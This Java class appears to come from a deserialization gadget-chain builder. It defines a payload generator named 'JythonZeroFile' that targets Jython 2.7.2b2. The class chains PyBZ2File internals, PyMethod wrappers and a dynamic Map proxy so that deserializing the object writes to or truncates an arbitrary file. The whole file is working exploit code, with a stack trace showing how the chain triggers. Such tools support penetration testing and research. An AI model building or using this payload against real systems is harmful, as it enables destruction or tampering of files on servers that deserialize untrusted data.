package org.ses.gadgetbuilder.chains1;

import org.python.core.*;
import org.python.modules.bz2.PyBZ2File;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.noparam.MapEntrySetTrampoline;

import java.lang.reflect.Proxy;
import java.util.Map;

@Authors({Authors.JACKOFMOSTTRADES})
@Impact(Impact.ZeroFile)
@Dependencies({"org.python:jython:2.7.2b2"})
public class JythonZeroFile extends GadgetChain<MapEntrySetTrampoline> {
    public JythonZeroFile(MapEntrySetTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {
        PyObject payloadclass = (PyObject) Class.forName(PyBZ2File.class.getName() + "$BZ2File___init___exposer")
                .getConstructor(PyType.class, PyObject.class, PyBuiltinCallable.Info.class).newInstance(null, new PyBZ2File(), null);
        PyMethod wrapperOne = new PyMethod(payloadclass, new PyString(command), null);
        PyMethod wrapperTwo = new PyMethod(wrapperOne, new PyString("w"), null);

        Map<String, Object> proxyMap = (Map<String, Object>) Proxy.newProxyInstance(this.getClass().getClassLoader(), new Class[]{Map.class}, wrapperTwo);

        return new TrampolineConnector(proxyMap);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "Map.entrySet() [Implemented as a proxy class with PyMethod InvocationHandler]\n" +
                "org.python.core.PyMethod.__call__()\n" +
                "org.python.core.PyMethod.__call__(state)\n" +
                "org.python.core.PyMethod.__call__(state, arg0)\n" +
                "org.python.core.BuiltinFunctions.__call__(state, arg0, arg1)\n" +
                "org.python.modules.bz2.PyBZ2File$BZ2File___init___exposer(args, kw)\n" +
                "org.python.modules.bz2.PyBZ2File.BZ2File___init__(args, kw)\n" +
                "FileOutputStream.<init>";
    }
}
